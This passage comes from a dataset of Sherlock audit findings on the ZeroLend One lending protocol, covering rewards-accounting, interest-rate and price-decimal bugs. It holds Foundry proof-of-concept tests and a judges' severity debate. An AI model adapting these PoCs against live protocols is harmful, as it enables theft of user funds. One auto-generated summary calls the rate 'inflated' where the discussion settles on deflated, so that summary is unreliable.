first.\n```solidity\nfunction getSupplyBalance(DataTypes.PositionBalance storage self, uint256 index) public view returns (uint256 supply) {\n-  uint256 increase = self.supplyShares.rayMul(index) - self.supplyShares.rayMul(self.lastSupplyLiquidtyIndex);\n-  return self.supplyShares + increase;\n- \n+  return self.supplyShares.rayMul(index);\n}\n```\n\nBelow is test code.\n```solidity\nfunction supplyForUser(address user, uint256 supplyAmount, uint256 tokenId, bool mintNewToken) public {\n  uint256 mintAmount = supplyAmount;\n  DataTypes.ExtraData memory data = DataTypes.ExtraData(bytes(''), bytes(''));\n  INFTPositionManager.AssetOperationParams memory params =\n    INFTPositionManager.AssetOperationParams(address(tokenA), user, supplyAmount, tokenId, data);\n\n  _mintAndApprove(user, tokenA, mintAmount, address(nftPositionManager));\n\n  vm.startPrank(user);\n  if (mintNewToken == true) {\n    nftPositionManager.mint(address(pool));\n  }\n  nftPositionManager.supply(params);\n  vm.stopPrank();\n}\n\nfunction borrowForUser(address user, uint256 borrowAmount, uint256 tokenId) public {\n  DataTypes.ExtraData memory data = DataTypes.ExtraData(bytes(''), bytes(''));\n  INFTPositionManager.AssetOperationParams memory params =\n    INFTPositionManager.AssetOperationParams(address(tokenA), user, borrowAmount, tokenId, data);\n\n  vm.startPrank(user);\n  nftPositionManager.borrow(params);\n  vm.stopPrank();\n}\n\nfunction testRewardDistribution() external {\n  DataTypes.ReserveData memory reserveData_0 = pool.getReserveData(address(tokenA));\n  console2.log('initial liquidity index                => ', reserveData_0.liquidityIndex);\n\n  address U1 = address(11);\n  address U2 = address(12);\n  address U3 = address(13);\n  \n  /**\n    User U1 wants to mint a new NFT (tokenId = 1) and supply 100 ether token\n    */\n  supplyForUser(U1, 100 ether, 1, true);\n  /**\n    User U2 wants to mint a new NFT (tokenId = 2) and supply 100 ether token\n    */\n  supplyForUser(U2, 100 ether, 2, true);\n\n  bytes32 assetHash = nftPositionManager.assetHash(address(pool), address(tokenA), false);\n\n  uint256 balancesOfU1 = nftPositionManager.balanceOfByAssetHash(1, assetHash);\n  uint256 balancesOfU2 = nftPositionManager.balanceOfByAssetHash(2, assetHash);\n  console2.log('initial balance of U1 for rewards      => ', balancesOfU1);\n  console2.log('initial balance of U2 for rewards      => ', balancesOfU2);\n\n  /**\n    For testing purposes, Alice mints a new NFT (tokenId = 3), supplies 1000 ether, and borrows 600 Ether. \n    This action increases the pool's liquidity rate to a non-zero value.\n    */\n  supplyForUser(alice, 1000 ether, 3, true);\n  borrowForUser(alice, 600 ether, 3);\n\n  DataTypes.ReserveData memory reserveData_1 = pool.getReserveData(address(tokenA));\n  console2.log('current liquidity rate                 => ', reserveData_1.liquidityRate);\n\n  /**\n    Skipping 2000 days is done for testing purposes to increase the liquidity index. \n    In a real environment, the liquidity index would increase continuously over time.\n    */\n  vm.warp(block.timestamp + 2000 days);\n\n  pool.forceUpdateReserve(address(tokenA));\n  DataTypes.ReserveData memory reserveData_2 = pool.getReserveData(address(tokenA));\n  console2.log('updated liquidity index                => ', reserveData_2.liquidityIndex);\n\n  /**\n    User U2 supplies 100 wei (a dust amount) to trigger an update of the balances for rewards.\n    */\n  supplyForUser(U2, 100, 2, false);\n\n  uint256 balancesOfU1Final = nftPositionManager.balanceOfByAssetHash(1, assetHash);\n  uint256 balancesOfU2Final = nftPositionManager.balanceOfByAssetHash(2, assetHash);\n  console2.log('final balance of U1 for rewards        => ', balancesOfU1Final);\n  console2.log('final balance of U2 for rewards        => ', balancesOfU2Final);\n\n  /**\n    User U3 wants to mint a new NFT (tokenId = 4) and supply 110 ether token\n    */\n  supplyForUser(U3, 110 ether, 4, true);\n  uint256 balancesOfU3Final = nftPositionManager.balanceOfByAssetHash(4, assetHash);\n  console2.log('final balance of U3 for rewards        => ', balancesOfU3Final);\n}\n```\n\nEverything is in below log:\n```solidity\ninitial liquidity index                =>  1000000000000000000000000000\ninitial balance of U1 for rewards      =>  100000000000000000000\ninitial balance of U2 for rewards      =>  100000000000000000000\ncurrent liquidity rate                 =>  43490566037735849056603774\nupdated liquidity index                =>  1238304471439648487981390542\nfinal balance of U1 for rewards        =>  100000000000000000000\nfinal balance of U2 for rewards        =>  123830447143964848898\nfinal balance of U3 for rewards        =>  110000000000000000000\n```\n\nThere is no `reward system` that requires users to continuously update their `balances`. \nHow can users realistically update their `balances` every second to receive accurate `rewards`? \nIs this practical?\n\n**0xspearmint1**\n\nescalate\n\nThis issue does not meet Sherlock's [criteria for a medium issue](https://docs.sherlock.xyz/audits/real-time-judging/judging#v.-how-to-identify-a-medium-issue) that requires the following:\n>Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.\n\nFor this issue to cause a 0.01% loss there must be an unrealistic increase in the liquidityIndex in an extremely small 14 day period. The POC provided inflates the liquidity index by borrowing a 60% of the funds at a huge interest rate for 5.5 years, this is absolutely not realistic and will never happen.\n\n\n\n\n**sherlock-admin3**\n\n> escalate\n> \n> This issue does not meet Sherlock's [criteria for a medium issue](https://docs.sherlock.xyz/audits/real-time-judging/judging#v.-how-to-identify-a-medium-issue) that requires the following:\n> >Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.\n> \n> For this issue to cause a 0.01% loss there must be an unrealistic increase in the liquidityIndex in an extremely small 14 day period. The POC provided inflates the liquidity index by borrowing a 60% of the funds at a huge interest rate for 5.5 years, this is absolutely not realistic and will never happen.\n> \n> \n> \n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**aliX40**\n\nThis issue is a high severity bug:\n- Tracking shares instead of assets is basically 101 of staking rewards contracts. \n- There is a provable and pocable significant  loss/theft of yield (more than 1%)\n- Rewards Accounting is completly false \n\n**obou07**\n\nescalate \nper [comment](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/393#issuecomment-2395124046)\n\n**sherlock-admin3**\n\n> escalate \n> per [comment](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/393#issuecomment-2395124046)\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**cvetanovv**\n\nI think this issue can be of High severity. \n\nThe attack path described in #58 shows very well how a user can deposit 1 USDC every day and earn more rewards than a normal user. \n\nTo execute this attack, we have almost no restrictions( except the normal ones, to have a reward and interest rate above zero), and the losses exceed 1%.\n\nPlanning to accept @obou07 escalation and make this issue High.\n\n**0xSpearmint**\n\n@cvetanovv This issue has a severe constraint:\n1. The other users must not update their position at all for an extended period of time (~4 months to create a 1% difference). This is an external constraint out of the control of the attacker. Furthermore, since a reward EPOCH lasts only 2 weeks it is likely that users will redeem rewards and then compound them back into their position, this totally protects them from the issue.\n\n\n**samuraii77**\n\nThe intended design is for users to __NOT__ update their position, thus it is expected for users to not update their positions for prolonged periods of time. For that reason, the used word \"constraint\" is not quite correct, it is not a constraint, it is the expected scenario.\n\n**0xSpearmint**\n\nHigh severity states\n>Definite loss of funds without (extensive) limitations of external conditions. The loss of the affected party must exceed 1%.\n\nWhat I described is an external condition (user does not update their position at all, for an extended period of time) that looks extensive to me. All it takes is for a user to supply/withdraw from their position once in a 4 month period to make this issue have very low impact.\n\n\n**samuraii77**\n\nThat is a limitation but not an extensive one as I mentioned in my above comment - users have absolutely no reason to update their positions usually. The only reason people would update their position is due to the issue mentioned in this report which means that only a few users who have a good understanding of Solidity and a rather malicious mindset would update their positions. \n\nFurthermore, it only takes 1 user not updating his position to cause a loss of funds.\n\n**0xSpearmint**\n\nIt is ridiculous to say the only reason people will update their position is this issue. Users modify their positions for a multitude of reasons in DEFI (moving to a different pool with more yield, compounding rewards, etc).\n\n**etherSky111**\n\nAs a normal DeFi user, will you update your position continuously?\n\n**0xSpearmint**\n\nAll the user has to do is update their position once every few months.\n\n**cvetanovv**\n\n@0xSpearmint is right. Most users are short-term investors(rather than long-term) who would update their positions more frequently. The chances of someone updating their position at least once every few months are huge and do not match the High severity rule, whereby there shall be **no limitations**.\n\nMy decision is to reject both escalations and leave this issue Medium severity.\n\n**iamnmt**\n\n@cvetanovv \n\n> Most users are short-term investors(rather than long-term) who would update their positions more frequently.\n\nI think it is not fair to make that assumption. It is a subjective assumption. It is equally likely a user is a short-term investor or a long-term investor. The impact for the long-term investor satisfies the high severity requirement.\n\n**0xSpearmint**\n\nALL investors (short term/ long term) are incentivised to compound rewards back into their positions ASAP to get a greater return.\n\n**etherSky111**\n\nOf course, the final decision is up to @cvetanovv  and I don't want to argue.\nBut @0xSpearmint is thinking wrongly.\n\n\n> ALL investors (short term/ long term) are incentivised to compound rewards back into their positions ASAP to get a greater return.\n\nCould you please let me know about any other reward system where stakers should update their positions repeatedly to get a correct rewards?\nThis is obviously a bug and there is no guarantee that all investers should update their positions ASAP to get a greater return.\n\nAs a long-term inversters, how do they know whether their rewards are calculated wrongly if they didn't update their positions?\nMaybe the protocol notify to them?\n\n**0xSpearmint**\n\nI agree this is an issue. But it does not meet sherlock's strict criteria for high severity.\n\nHere is sherlock's criteria for medium:\n>Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained.\n\nThis issue requires a specific external condition, the other users must not update their position **at all for an extended period of time** (4 months).\n\n**etherSky111**\n\nThis is my last comment.\n\n\n> I agree this is an issue. But it does not meet sherlock's strict criteria for high severity.\n> \n> Here is sherlock's criteria for medium:\n> \n> > Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained.\n> \n> This issue requires a specific external condition, the other users must not update their position **at all for an extended period of time** (4 months).\n\nThis is not a specific external condition.\nImagine there are 100 stakers and are you sure that all these users update their positions in 4 months?\nIf I am a long term staker and I deposited large tokens to get `ZERO` token rewards, I won't update my positions for a long period as I believe the rewards calculation is correct.\nUnfortunately, there is an error in the rewards calculation and I will lose funds accidently.\nBut I think this is at most medium issue because this is my mistake to not update my positions accordingly.\nI should've update my positions every 4 months.\n\nAnd please stop arguing and let the judge decide.\n\n\n**cvetanovv**\n\nThis is the rule for **High** severity:\n\n> Definite loss of funds **without** (extensive) limitations of external conditions. The loss of the affected party must exceed 1%.\n\nWe only have a 1% loss if someone doesn't update their position for a few months. This is a serious limitation. To be High severity, there should be no limitation as written in the rule.\n\nBut it perfectly fits the **Medium** severity rule:\n\n>Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.\n\nMy decision is to reject both escalations and leave this issue Medium severity.\n\n**WangSecurity**\n\nResult:\nMedium\nHas duplicates\n\n**sherlock-admin3**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [0xspearmint1](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/393/#issuecomment-2393292065): rejected\n- [obou07](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/393/#issuecomment-2395131426): rejected",
      "summary": "\nThe report discusses a bug in the rewards distribution system of the NFTPositionManager. The distribution of rewards is not working correctly, and it is found that users must continuously update their balances in order to receive accurate rewards. This is not practical for users to do, and there is a debate about whether this issue should be classified as medium or high severity. Some argue that the issue only causes a loss of funds if certain external conditions are met, while others argue that it can lead to a definite loss of funds without limitations. Ultimately, the decision is made to classify the issue as medium severity.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/393",
      "tags": [],
      "finders": [
        "000000",
        "0xNirix",
        "ether\\_sky",
        "A2-security",
        "iamnmt"
      ]
    },
    {
      "id": "41826",
      "title": "M-5: After a User withdraws The interest Rate is not updated accordingly leading to the next user using an inflated index during next deposit before the rate is normalized again",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/387 \n\n## Found by \nA2-security, Bigsam, Obsidian, iamnmt\n### Summary\n\nA bug in Zerolend's withdrawal mechanism causes the interest rate to not be updated when funds are transferred to the treasury during a withdrawal. This failure leads to the next user encountering an inflated interest rate when performing subsequent actions like deposit, withdrawal or borrow before the rate is normalized again. The issue arises because the liquidity in the pool drops due to the funds being transferred to the treasury, but the system fails to update the interest rate to reflect this change.\n\n### Root Cause\n\nExamples of update rate before transferring everywhere in the protocol to maintain Rate \n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/SupplyLogic.sol#L69-L81\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/SupplyLogic.sol#L125-L146\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol#L88-L99\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol#L139-L158\n\nThe same process can be observed in Aave v 3.\n\n1. https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/SupplyLogic.sol#L130\n2. https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/SupplyLogic.sol#L65\n3. https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/BorrowLogic.sol#L145-L150\n4.  https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/BorrowLogic.sol#L227-L232\n\nLooking at the effect of updating rate \n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L134-L182\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/periphery/ir/DefaultReserveInterestRateStrategy.sol#L98-L131\n\nThis rates are used to get the new index\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L225-L227\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L235-L237\n\n### Internal pre-conditions\n\n_No response_\n\n### External pre-conditions\n\n_No response_\n\n### Attack Path\n\nIn the current implementation of Zerolend, during a **withdrawal**, the protocol transfers a portion of the funds to the **treasury**. However, it does not update the interest rate before this transfer has being done for all transfers, leading to an **inflated liquidity rate** being used by the next user, particularly for deposits. This is problematic as the next user deposits/withdraws at a rate that is incorrectly high, causing them to receive fewer shares than they should.\n\nIn comparison, Aave mints shares to the treasury, which can later withdraw this funds like any other user. \n\nEach withdrawal out of the contract in underlying asset **in Aave** updates the interest rate, ensuring the rates reflect the true liquidity available in the pool.\n\n Zerolend's approach of transferring funds directly upon every user withdrawal fails to adjust the interest rate properly, resulting in a temporary discrepancy that affects subsequent users.\n\n#### Code Context:\n\nIn the **`executeMintToTreasury`** function, the accrued shares for the treasury are transferred, but the interest rates are not updated to account for the change in liquidity.\n\n```solidity\nfunction executeMintToTreasury(\n    DataTypes.ReserveSupplies storage totalSupply,\n    mapping(address => DataTypes.ReserveData) storage reservesData,\n    address treasury,\n    address asset\n  ) external {\n    DataTypes.ReserveData storage reserve = reservesData[asset];\n\n    uint256 accruedToTreasuryShares = reserve.accruedToTreasuryShares;\n\n    if (accruedToTreasuryShares != 0) {\n      reserve.accruedToTreasuryShares = 0;\n      uint256 normalizedIncome = reserve.getNormalizedIncome();\n      uint256 amountToMint = accruedToTreasuryShares.rayMul(normalizedIncome);\n\n@audit>> no interest rate update before fund removal >>       IERC20(asset).safeTransfer(treasury, amountToMint);\n\n      totalSupply.supplyShares -= accruedToTreasuryShares;\n\n      emit PoolEventsLib.MintedToTreasury(asset, amountToMint);\n    }\n  }\n```\n\nAs can be seen in this snippet, the funds are transferred to the treasury, but the function does not invoke any interest rate update mechanism. The liquidity in the pool decreases, but the next user's deposit will use an inflated rate due to this oversight.\n\n#### Interest Rate Update Example (Correct Flow):\n\nIn other parts of the code, such as during withdrawals, the interest rate is properly updated when liquidity changes:\n\n```solidity\n\n function executeWithdraw(\n    mapping(address => DataTypes.Res\n\n---------------------------------------\nreserve.updateInterestRates(\n  totalSupplies,\n  cache,\n  params.asset,\n  IPool(params.pool).getReserveFactor(),\n  0,  // No liquidity added\n  params.amount,  // Liquidity taken during withdrawal\n  params.position,\n  params.data.interestRateData\n);\n```\n\nThe **`updateInterestRates`** function correctly calculates the new interest rate based on the changes in liquidity, ensuring the system uses accurate rates for subsequent operations.\n\n#### Example of Problem:\n\nConsider the following scenario:\n- A user withdraws a portion of funds, which triggers the transfer of some assets to the treasury.\n- The liquidity in the pool drops, but the interest rate is not updated.\n- The next user deposits into the pool using the **inflated liquidity rate**, resulting in fewer shares being minted for them.\n\nSince the actual liquidity is lower than the interest rate assumes, the user depositing gets fewer shares than expected.\n\n---\n\n### Impact\n\n- **Incorrect Share Calculation**: Users depositing after a treasury withdrawal will receive fewer shares due to an artificially high liquidity rate than the appropriate one , leading to loss of potential value.\n\n### PoC\n\n_No response_\n\n### Mitigation\n\nThe mitigation involves ensuring that the **interest rate** is properly updated **before** transferring funds to the treasury. The rate update should account for the liquidity being transferred out, ensuring the new rates reflect the actual available liquidity in the pool.\n\n#### Suggested Fix:\n\nIn the **`executeMintToTreasury`** function, call the **`updateInterestRates`** function **before** transferring the assets to the treasury. This will ensure that the interest rate reflects the updated liquidity in the pool before the funds are moved.\n\n##### Modified Code Example:\n\n```solidity\nfunction executeMintToTreasury(\n    DataTypes.ReserveSupplies storage totalSupply,\n    mapping(address => DataTypes.ReserveData) storage reservesData,\n    address treasury,\n    address asset\n  ) external {\n    DataTypes.ReserveData storage reserve = reservesData[asset];\n\n    uint256 accruedToTreasuryShares = reserve.accruedToTreasuryShares;\n\n    if (accruedToTreasuryShares != 0) {\n      reserve.accruedToTreasuryShares = 0;\n      uint256 normalizedIncome = reserve.getNormalizedIncome();\n      uint256 amountToMint = accruedToTreasuryShares.rayMul(normalizedIncome);\n\n++     // Update the interest rates before transferring to the treasury\n++      reserve.updateInterestRates(\n++        totalSupply,\n++       DataTypes.ReserveCache({}), // Supply necessary cache data\n++        asset,\n++       IPool(asset).getReserveFactor(),\n++        0, // No liquidity added\n++       amountToMint, // Liquidity taken corresponds to amount sent to treasury\n++        bytes32(0), // Position details (if any)\n++       new bytes(0) // Interest rate data (if any)\n++      );\n\n      IERC20(asset).safeTransfer(treasury, amountToMint);\n      totalSupply.supplyShares -= accruedToTreasuryShares;\n\n      emit PoolEventsLib.MintedToTreasury(asset, amountToMint);\n    }\n  }\n```\n\nIn this updated version, the interest rates are recalculated to account for the **liquidity sent** to the treasury. This ensures that the **next user's deposit** uses a correctly updated interest rate.\n\n---\n\n\n\n## Discussion\n\n**sherlock-admin3**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**Honour** commented:\n>  Possibly valid. However claims the rates are inflated which i believe is false and the opposite happens( deflated rates) this is because the pool balance will be higher at the time interest rates are calculated (hence lower utilization and lower rates)\n\n\n\n**nevillehuang**\n\nrequest poc\n\n**sherlock-admin4**\n\nPoC requested from @Tomiwasa0\n\nRequests remaining: **15**\n\n**Tomiwasa0**\n\n1. After setting Flashloan premium to 0.09%\n\n2. Import to the WithdrawtTEST\n\n```solidity\n++ import {IPool} from './../../../../contracts/interfaces/pool/IPool.sol';\n++ import {MockFlashLoanSimpleReceiver} from './../../../../contracts/mocks/MockSimpleFlashLoanReceiver.sol';\n\ncontract PoolWithdrawTests is PoolSetup {\n++   address alice = address(1);\n++  address bob = address(2);\n\n  \n++  event Transfer(address indexed from, address indexed to, uint256 value);\n```\n\n3. PASTE AND RUN THE POC\n```solidity\nfunction _generateFlashloanCondition() internal {\n    // Mint and approve tokenA and tokenC for bob\n    _mintAndApprove(bob, tokenA, 60 ether, address(pool));\n    _mintAndApprove(bob, tokenC, 2500 ether, address(pool));\n\n    // Start prank as bob to simulate transactions from bob's account\n    vm.startPrank(bob);\n\n    // Supply tokenC to the pool for bob\n    pool.supplySimple(address(tokenC), bob, 1000 ether, 0);\n\n    // Stop prank as bob\n    vm.stopPrank();\n}\n```\n\n### Updated `testPoolWithdraw` Function:\n```solidity\nfunction testPoolWithdraw() external {\n    // Declare amounts for supply, mint, withdraw, and borrow\n    uint256 supplyAmount = 60 ether;\n    uint256 mintAmount = 150 ether;\n    uint256 withdrawAmount = 10 ether;\n    uint256 index = 1;\n    uint256 borrowAmount = 20 ether;\n\n    // Mint and approve tokenA for owner\n    vm.startPrank(owner);\n    tokenA.mint(owner, mintAmount);\n    tokenA.approve(address(pool), supplyAmount);\n\n    // Supply tokenA to the pool for owner\n    pool.supplySimple(address(tokenA), owner, supplyAmount, index);\n\n    // Assert the balances after supplying tokenA\n    assertEq(tokenA.balanceOf(address(pool)), supplyAmount, 'Pool Balance Supply');\n    assertEq(tokenA.balanceOf(owner), mintAmount - supplyAmount, 'Owner Balance Supply');\n    assertEq(pool.getTotalSupplyRaw(address(tokenA)).supplyShares, supplyAmount);\n    assertEq(pool.getBalanceRaw(address(tokenA), owner, index).supplyShares, supplyAmount);\n\n    // Advance time by 100 seconds\n    uint256 currentTime1 = block.timestamp;\n    vm.warp(currentTime1 + 100);\n\n    // Borrow tokenA\n    pool.borrowSimple(address(tokenA), owner, borrowAmount, 1);\n    assertEq(tokenA.balanceOf(address(pool)), supplyAmount - borrowAmount);\n    assertEq(pool.getDebt(address(tokenA), owner, 1), borrowAmount);\n    assertEq(pool.totalDebt(address(tokenA)), borrowAmount);\n\n    vm.stopPrank();\n\n    // Advance time by 50 seconds\n    uint256 currentTime2 = block.timestamp;\n    vm.warp(currentTime2 + 50);\n\n    // Prepare and execute flash loan\n    bytes memory emptyParams;\n    MockFlashLoanSimpleReceiver mockFlashSimpleReceiver = new MockFlashLoanSimpleReceiver(pool);\n    _generateFlashloanCondition();\n\n    uint256 premium = poolFactory.flashLoanPremiumToProtocol();\n\n    vm.startPrank(alice);\n    tokenA.mint(alice, 10 ether);\n\n    // Expect flash loan event emission\n    vm.expectEmit(true, true, true, true);\n    emit PoolEventsLib.FlashLoan(address(mockFlashSimpleReceiver), alice, address(tokenA), 40 ether, (40 ether * premium) / 10_000);\n    emit Transfer(address(0), address(mockFlashSimpleReceiver), (40 ether * premium) / 10_000);\n\n    // Execute the flash loan\n    pool.flashLoanSimple(address(mockFlashSimpleReceiver), address(tokenA), 40 ether, emptyParams);\n    vm.stopPrank();\n\n    // Advance time by 200 seconds\n    uint256 currentTime = block.timestamp;\n    vm.warp(currentTime + 200);\n\n    // Assert the pool's balance after withdrawal\n    assertEq(tokenA.balanceOf(address(pool)), 40036000000000000000, 'Pool Balance Withdraw');\n\n    // Withdraw tokenA from the pool for the owner\n    vm.startPrank(owner);\n    pool.withdrawSimple(address(tokenA), owner, withdrawAmount, index);\n\n    // Advance time by 50 seconds\n    uint256 currentTime3 = block.timestamp;\n    vm.warp(currentTime3 + 50);\n\n    // Assert the remaining balance after withdrawal\n    assertEq(pool.getBalanceRaw(address(tokenA), owner, index).supplyShares, 50000001310612529086);\n\n    // Bob mints and supplies more tokenA\n    vm.startPrank(bob);\n    tokenA.mint(owner, mintAmount);\n    tokenA.approve(address(pool), supplyAmount);\n    pool.supplySimple(address(tokenA), bob, 60 ether, index);\n\n    // Assert the balance after Bob's supply\n    assertEq(pool.getBalanceRaw(address(tokenA), bob, index).supplyShares, 59999989872672182169);\n}\n```\nBefore Updating the index with Amount minted to tresury \nBob got - 59999989872672182169;\nAfter update -  59999989869411349179,\n\n```solidity\nFailing tests:\nEncountered 1 failing test in test/forge/core/pool/PoolWithdrawTests.t.sol:PoolWithdrawTests\n[FAIL. Reason: assertion failed: 59999989869411349179 != 59999989872672182169] testPoolWithdraw() (gas: 1531924)\n\nEncountered a total of 1 failing tests, 0 tests succeeded\n```\n\n4. I agree with the initial statement that the impact is a deflation, Apologies for the confusion i calculated this on paper initially and a tiny error was made. \n5. The attacker will mint more shares than they should and this can be weaponised to game the system for some profit by an attacker who just need to simply wait for a withdraw and then deposit lots of funds. \n6. Since DefaultReserveInterestRateStrategy uses IERC20(params.reserve).balanceOf(msg.sender). Attacker gains more amount than they should when the new rate is normalised.",
      "summary": "\nThis bug report discusses an issue with Zerolend's withdrawal mechanism, which leads to an incorrect interest rate being used for subsequent actions. This happens because the system fails to update the interest rate after transferring funds to the treasury during a withdrawal. This results in an inflated interest rate being used for actions like deposit, withdrawal, or borrow, leading to users receiving fewer shares than they should. The root cause of the issue is traced to the lack of interest rate updates in certain parts of the code. The impact of this bug is a deflation of shares, and it can be exploited by an attacker to gain more funds than they should. The suggested fix involves updating the interest rate before transferring funds to the treasury. A proof of concept has been requested, and the report concludes with a discussion on the impact and potential exploitation of this bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/387",
      "tags": [],
      "finders": [
        "A2-security",
        "iamnmt",
        "Obsidian",
        "Bigsam"
      ]
    },
    {
      "id": "41825",
      "title": "M-4: `GenericLogic.sol` contract assumes all price feeds has the same decimals but is a wrong assumption that leads to an incorrect health factor math.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/166 \n\n## Found by \n000000, A2-security, Honour, Obsidian, coffiasd, iamnmt, nfmelendez, silver\\_eth, stuart\\_the\\_minion\n### Summary\n\nMixing price feeds decimals when doing the calculation of  `totalCollateralInBaseCurrency` and `totalDebtInBaseCurrency` will cause an incorrect `healthFactor` affecting important operations of the protocol such as `liquidation`, `borrow` and `withdraw`. `GenericLogic.sol` contract assumes all price feeds have the same decimals but is a wrong assumption as is demonstrated in the Root cause section.\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/GenericLogic.sol#L106-L128\n\n### Root Cause\n\n`GenericLogic.sol:69 calculateUserAccountData` calculates the `totalCollateralInBaseCurrency` and the `totalDebtInBaseCurrency` doing a sum of all the differents reserve assets as collateral or debt in base currency but the problem is a wrong assumption that all chainlink price feeds has the same decimals. Most USD price feeds has 8 decimals but for example [AMPL / USD](https://etherscan.io/address/0xe20CA8D7546932360e37E9D72c1a47334af57706) feed has 18 decimals. So `totalCollateralInBaseCurrency` and the `totalDebtInBaseCurrency` will be incorrect because `calculateUserAccountData` will sum asset prices with different decimals leading to a wrong calculation of the health factor and incorrect function of many protocol operations. \n\n### Internal pre-conditions\n\n1. Price feeds for collateral or debt assets in a given position needs to have different decimals.\n\n\n### External pre-conditions\n\nNone\n\n### Attack Path\n\nIs a wrong assumption proven by example\n\n\n### Impact\n\n1. Liquidation: Mixing Price decimals lead to incorrect calculation of the `healthFactor` that is a result of wrong `totalCollateralInBaseCurrency` and the `totalDebtInBaseCurrency`.\n2. Borrow: Wrong `healthFactor` also affects borrowing when doing validations to make sure that the position is not liquiditable.\n3. Withdraw: Also uses `healthFactor` via `ValidationLofic::validateHFAndLtv`\n4. executeUseReserveAsCollateral: Also uses `healthFactor` via `ValidationLofic::validateHFAndLtv`\n5. Any other operation that uses the health factor.\n\n\n### PoC\n\nnone\n\n### Mitigation\n\nThere are 2 possible solution:\n\n1. Some protocols enforce 8 decimals when assigning an oracle to an asset or reject the operation. (easy, simple, secure, not flexible)\n2. Use AggregatorV3Interface::decimals to normalize to N decimals the price making sure that the precision loss is on the correct side. (flexible)\n\n\n\n\n## Discussion\n\n**nevillehuang**\n\nAs seen [here](https://github.com/sherlock-audit/2024-06-new-scope?tab=readme-ov-file#q-are-there-any-limitations-on-values-set-by-admins-or-other-roles-in-protocols-you-integrate-with-including-restrictions-on-array-lengths)\n\n> Q: Are there any limitations on values set by admins (or other roles) in protocols you integrate with, including restrictions on array lengths?\n> No\n\nThere is no limits to admin set chainlink oracles, so it is presumed that they will act accordingly when integrating tokens.\n\n> (External) Admin trust assumptions: When a function is access restricted, only values for specific function variables mentioned in the README can be taken into account when identifying an attack path.\n\n> If no values are provided, the (external) admin is trusted to use values that will not cause any issues.\n\n**Honour-d-dev**\n\nEscalate \n\nthis issue is valid!\n\nThe above [comment](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/166#issuecomment-2388428543) is not a valid reason for it to be invalid, pools are permissionless and anyone can create a pool and choose to integrate these tokens with un-conventional price feed decimals and the impact on users can be severe especially if not detected early.\n\nIf the argument is that the oracle can be removed or the token can be paused by admin if such an issue occurs, the impact is still severe (loss of funds for users , liquidation etc) and not reversible. Such cases can be easily prevented by the mitigation provided in the report.\n\n**sherlock-admin3**\n\n> Escalate \n> \n> this issue is valid!\n> \n> The above [comment](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/166#issuecomment-2388428543) is not a valid reason for it to be invalid, pools are permissionless and anyone can create a pool and choose to integrate these tokens with un-conventional price feed decimals and the impact on users can be severe especially if not detected early.\n> \n> If the argument is that the oracle can be removed or the token can be paused by admin if such an issue occurs, the impact is still severe (loss of funds for users , liquidation etc) and not reversible. Such cases can be easily prevented by the mitigation provided in the report.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**cvetanovv**\n\nThe Lead Judge is right with his comment: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/166#issuecomment-2388428543\n\nIn addition, pool managers are expected to act rationally(i.e. are trusted):\n\n> Essentially we expect all permissioned actors to behave rationally.\n>\n> There are two set of actors. Actors who manage pools and actors who mange 